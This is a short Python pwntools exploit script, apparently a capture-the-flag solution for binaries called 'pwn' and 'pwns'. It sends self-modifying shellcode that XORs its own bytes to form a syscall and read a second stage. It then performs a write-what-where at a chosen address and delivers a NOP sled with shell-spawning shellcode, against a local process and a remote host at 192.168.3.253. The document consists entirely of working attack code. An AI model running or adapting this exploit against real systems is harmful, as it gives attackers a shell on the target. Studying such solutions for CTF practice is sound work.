from pwn import *
context(arch='amd64', os='linux', log_level='debug')
def pwn():
    s=process("./pwn")
    s.sendlineafter(b"length:\n",b"32")
    shellcode="""
    push r12;pop rdi
    push r12;pop rax
    mov esi,dword ptr [rsi]
    inc dh
    xor dword ptr [rip],0x9f
    nop
    """
    s.sendafter(b"code:\n",asm(shellcode)+b"\x05")
    s.sendlineafter(b"Where?\n",b"4031b0")
    s.sendafter(b"What?\n",p64(0x20230000))
    s.send(b"\x90"*0x20+asm(shellcraft.sh()))
    s.interactive()

def pwns():
    #s=process("../dist/pwns")
    #pause()
    s=remote("192.168.3.253",53003)
    s.sendlineafter(b"length:\n",b"32")
    shellcodes="""
    xor rax,rax
    mov esi,0x20230000
    xor dword ptr [rip],0x9f
    nop
    """
    s.sendafter(b"code:\n",asm(shellcodes)+b"\x05")
    s.sendlineafter(b"Where?\n",b"4DB038")
    s.sendafter(b"What?\n",p64(0x20230000))
    s.send(b"\x90"*0x20+asm(shellcraft.sh()))
    s.interactive()

if __name__=="__main__":
    #pwn()
    pwns()